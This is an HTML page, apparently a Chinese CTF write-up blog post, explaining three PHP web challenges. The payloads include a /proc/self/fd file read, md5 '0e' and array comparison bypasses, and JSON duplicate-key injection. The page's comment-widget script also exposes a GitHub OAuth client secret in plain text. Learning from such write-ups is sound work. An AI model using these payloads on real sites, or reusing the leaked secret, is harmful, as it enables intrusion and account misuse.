+<p>如果您熟悉Linux，你会想起来这里还有一个文件描述符。</p>
+<p>关于文件描述符的介绍可以参考维基百科：<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6">https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6</a></p>
+<p>此外，您还需要了解下procfs，详细请参考维基百科：<a href="https://zh.wikipedia.org/wiki/Procfs">https://zh.wikipedia.org/wiki/Procfs</a></p>
+<p>通过任意文件读，直接读取当前进程下的文件描述符即可获得flag。</p>
+<p>payload：</p>
+<pre><code>file=/proc/self/fd/3
+</code></pre>
+<h3 id="ez_bypass">ez_bypass</h3>
+<p>php代码审计，主要是三关。</p>
+<p>Step 1：</p>
+<p>你需要找到两个md5值相同，但是本身却不相同的值，这显然是相当难找的。</p>
+<p>php中的两个坑可以实现这一点。</p>
+<ul>
+<li>在进行比较运算时，如果遇到了 <code>0e\d+</code> 这种字符串，就会将这种字符串解析为科学计数法。</li>
+<li>md5（）函数的描述是 <code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code>md5()</code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</li>
+</ul>
+<p>所以，找到两个md5后，值满足 <code>0e\d+</code> 模式的串或者直接传入两个不同的数组即可。</p>
+<p>Step 2：</p>
+<p>需要一个不是数字，但是值等于20200501的pw。利用非严格比较字符串和数字时，自动把字符串转换为数字的特性，即可绕过。</p>
+<pre><code>pw=20200501any letter
+</code></pre>
+<p>Step 3：</p>
+<p>要求json中的<code>password</code>键的值为<code>shouhukunkun</code>，但是<code>password</code>是通过前面的<code>pw</code>设置的。</p>
+<p>利用<code>json_decode</code>遇到重复键时，取最后一个的特性，注入json，即可绕过。</p>
+<pre><code>pw=20200501&quot;, &quot;password&quot; : &quot;shouhukunkun
+</code></pre>
+<h3 id="">是什么蒙蔽了你的双眼</h3>
+<p>GET参数<code>jpg</code>三次base64解码后，得到<code>flag.jpg</code>。知道了编码规则以后，可以尝试读一下其他文件。</p>
+<p>读取<code>index.php</code>，可以得到源码，审计可以发现是一个简单的过滤逻辑，只能读取当前目录下文件名不含有<code>config</code>和特殊符号的文件。</p>
+<p>注释里给了一篇博客链接。</p>
+<pre><code>/*
+ * https://www.cnblogs.com/embedded-linux/p/12638906.html
+ * Date: 2016-12-20 23:26
+ */
+</code></pre>
+<p>看完博客，您肯定觉得没有什么锤子用，但是您仔细看的话，您会发现时间对不上。</p>
+<p>找到对应时间的博客，是这篇</p>
+<pre><code>vim中.swp文件处理
+https://www.cnblogs.com/embedded-linux/p/6205004.html
+</code></pre>
+<p>猜测存在vim的缓存文件，读取<code>.index.php.swp</code>，可以知道flag在<code>f1lllaggg!lilac.php</code>。</p>
+<p>通过之前审计的过滤规则，可以知道会将<code>config</code>替换为<code>!</code>，从而可以读取<code>f1lllaggg!lilac.php</code>的源码。</p>
+<p>审计下，存在变量覆盖。因为<code>$k</code>文件不存在，所以直接传入一个空的<code>$t</code>，由于弱类型比较，<code>&quot;&quot; == false //true</code>，即可获得flag。此外，也可以覆盖<code>$k</code>，读取远程目录的文件。</p>
+<p>如果您嫌上述过程过于麻烦，不妨看看最开始的那张图，flag就在图上。</p>
+<!--kg-card-end: markdown-->
+                </div>
+            </section>
+
+
+            <div id="gitalk-container"></div>
+
+            <link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.css">
+            <script src="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.min.js"></script>
+
+            <script>
+                const gitalk = new Gitalk({
+
+                    proxy: 'https://cors.pion1eer.workers.dev/?https://github.com/login/oauth/access_token',
+
+                    clientID: '9f7e67174f5ab8b1a2b9',
+                    clientSecret: 'ddee425a0b50ed02a05fdedb1a4ea039e01b3170',
+                    repo: 'blogComment',
+                    owner: 'Ruanxingzhi',
+                    admin: ['Ruanxingzhi'],
+                    id: location.pathname,      // Ensure uniqueness and length less than 50
+                    distractionFreeMode: false  // Facebook-like distraction free mode
+
+                    });
+
+                gitalk.render('gitalk-container');
+            </script>
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <h3><span>More in</span> <a href="../tag/writeup/index.html">writeup</a></h3>
+                    </header>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li>
+                                <h4><a href="../php-unserialize-writeups/index.html">PHP 反序列化漏洞题解集</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2021-08-11">11 Aug 2021</time> –
+                                        7 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="../automata-2019/index.html">形式语言2019期末题解</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-07-16">16 Jul 2020</time> –
+                                        6 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="../babylfsr/index.html">Babylfsr writeup</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-05-15">15 May 2020</time> –
+                                        4 min read</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="../tag/writeup/index.html">See all 4 posts
+                            →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-crypto no-image no-image">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../coppersmith/index.html">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">Crypto</div>
+                <h2 class="post-card-title">Coppersmith 攻击</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Coppersmith 可以用于求多项式的小根，经常用于 RSA 攻击中“已知某些二进制位，求剩余位”这一类问题。本文讨论了多种利用方式。</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Ruan Xingzhi
+                    </div>
+            
+                    <a href="../author/blue/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/05/blue.jpeg" alt="Ruan Xingzhi" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/blue/index.html">Ruan Xingzhi</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-05-12">12 May 2020</time> <span class="bull">&bull;</span> 10 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post tag-crypto tag-ecc no-image no-image">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../elliptic-elgamal/index.html">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">Crypto</div>
+                <h2 class="post-card-title">椭圆曲线 Elgamal 公钥密码体系</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>椭圆曲线密码学系列的第三篇。讨论了椭圆曲线上的Elgamal公钥密码体系，给出了加密、解密的代码实现。</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Ruan Xingzhi
+                    </div>
+            
+                    <a href="../author/blue/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/05/blue.jpeg" alt="Ruan Xingzhi" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/blue/index.html">Ruan Xingzhi</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-05-05">5 May 2020</time> <span class="bull">&bull;</span> 2 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="../index.html">Pion1eer</a> &copy; 2023</section>
+                <nav class="site-footer-nav">
+                    <a href="http://beian.miit.gov.cn/" target="_blank">湘ICP备20008720号-1</a>
+                    <a href="../index.html">Latest Posts</a>
+                    
+                    
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+<!--
+
+    <div class="subscribe-success-message">
+        <a class="subscribe-close" href="javascript:;"></a>
+        You've successfully subscribed to Pion1eer!
+    </div>
+
+    <div id="subscribe" class="subscribe-overlay">
+        <a class="subscribe-close" href="#"></a>
+        <div class="subscribe-overlay-content">
+            <div class="subscribe-form">
+                <h1 class="subscribe-overlay-title">Subscribe to Pion1eer</h1>
+                <p class="subscribe-overlay-description">Stay up to date! Get all the latest & greatest posts delivered straight to your inbox</p>
+                <form data-members-form="subscribe">
+                    <div class="form-group">
+                        <input class="subscribe-email" data-members-email placeholder="youremail@example.com"
+                            autocomplete="false" />
+                        <button class="button primary" type="submit">
+                            <span class="button-content">Subscribe</span>
+                            <span class="button-loader"><svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px"
+    y="0px" width="40px" height="40px" viewBox="0 0 40 40" enable-background="new 0 0 40 40" xml:space="preserve">
+    <path opacity="0.2" fill="#000" d="M20.201,5.169c-8.254,0-14.946,6.692-14.946,14.946c0,8.255,6.692,14.946,14.946,14.946
+s14.946-6.691,14.946-14.946C35.146,11.861,28.455,5.169,20.201,5.169z M20.201,31.749c-6.425,0-11.634-5.208-11.634-11.634
+c0-6.425,5.209-11.634,11.634-11.634c6.425,0,11.633,5.209,11.633,11.634C31.834,26.541,26.626,31.749,20.201,31.749z" />
+    <path fill="#000" d="M26.013,10.047l1.654-2.866c-2.198-1.272-4.743-2.012-7.466-2.012h0v3.312h0
+C22.32,8.481,24.301,9.057,26.013,10.047z">
+        <animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 20 20" to="360 20 20"
+            dur="0.5s" repeatCount="indefinite" />
+    </path>
+</svg></span>
+                        </button>
+                    </div>
+                    <div class="message-success">
+                        <strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
+                    </div>
+                    <div class="message-error">
+                        Please enter a valid email address!
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+-->
+
+    <script
+        src="https://cdn.ruanx.net/js/jquery.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+        crossorigin="anonymous">
+    </script>
+    <script src="../assets/built/casper%EF%B9%96v=792c672b3c.js"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+<script src="https://cdn.staticfile.org/highlight.js/10.1.1/highlight.min.js"></script>
+<script >hljs.initHighlightingOnLoad();</script>
+
+
+
+    <style>.kg-bookmark-metadata > .kg-bookmark-publisher:before {
+    content: "" !important; 
+    margin: 0 !important;
+}
+</style>
+
+</body>
+</html>
